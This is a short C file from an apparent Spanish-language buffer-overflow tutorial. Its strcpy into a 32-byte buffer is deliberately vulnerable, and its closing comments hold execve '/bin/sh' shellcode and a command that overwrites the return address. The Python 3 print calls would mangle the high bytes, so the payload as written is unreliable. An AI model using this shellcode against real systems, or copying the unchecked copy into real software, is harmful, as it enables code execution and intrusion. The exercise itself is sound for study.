/* vuln1.c por Rojodos */

#include <stdio.h>
#include <string.h>

int main (int argc, char **argv){
    char buffer[32] = "";

    if (argc < 2) {  // Si los argumentos son menores que 2...
        printf ("Introduzca un argumento al programa\n"); //Printeamos
        return 0;  // y retornamos 0 a la función main, y el programa acaba
    }

    strcpy(buffer, argv[1]); // Aqui es donde esta el fallo.

    return 0;

}

// export PWN=`python3 -c 'print("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")'`
// ./vuln1 $(python3 -c 'print("A" * 40 + "\xca\xef\x7f\xff\xff\xff\x00\x00")')
